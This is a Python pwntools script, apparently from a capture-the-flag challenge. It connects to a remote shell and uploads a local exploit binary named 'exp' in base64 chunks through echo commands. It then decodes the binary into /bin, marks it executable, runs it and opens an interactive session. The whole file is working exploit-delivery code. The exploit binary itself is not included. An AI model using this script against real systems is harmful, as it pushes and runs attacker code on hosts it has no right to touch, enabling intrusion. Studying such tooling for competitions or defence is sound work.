import io
import tarfile
from pwn import *
import base64
import pickle
from tqdm import tqdm

# context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]

_addr = "111.186.57.85"
_port = "40289"

_addr = "localhost"
_port = "9999"

p = remote(_addr, _port)
p.newline = b"\r\n"


def _upload_file(data: bytes, filename: str) -> None:
    """
    upload the file in base64 format

    string is divided into chunks of 100 bytes
    only support / # prompt
    """
    print(f"[INFO] Uploading {filename}...")

    b64Data = base64.b64encode(data)
    assert b"\n" not in b64Data
    print(f"[INFO] compress finished, start uploading...")

    _SIZE = 500
    _b64Data_chunks = [b64Data[i : i + _SIZE] for i in range(0, len(b64Data), _SIZE)]
    for chunk in tqdm(_b64Data_chunks):
        p.recvuntil("/ #".encode())
        cmdline = f"echo -n '{chunk.decode()}' >> '/tmp/{filename}.b64'"
        print(f"[INFO] {cmdline}")
        p.sendline(cmdline.encode())

    print(f"[INFO] upload finished, start decoding...")
    p.recvuntil("/ #".encode())
    p.sendline(f"cat '/tmp/{filename}.b64' | base64 -d > '/bin/{filename}'".encode())

    print(f"[INFO] done")


"""
Upload the binary
"""

main_bin = "src/exp"
with open(main_bin, "rb") as f:
    _upload_file(f.read(), "exp")

"""
execute the binary
"""
p.recvuntil("/ #".encode())
p.sendline("chmod +x /bin/exp".encode())
p.recvuntil("/ #".encode())
p.sendline("/bin/exp".encode())

# while True:
#     p.sendline(input().strip())
#     out = p.recvuntil("/ #".encode())
#     tmp = out.decode("utf-8")
#     print(tmp)
# p.recvuntil("/ #".encode())
p.interactive()
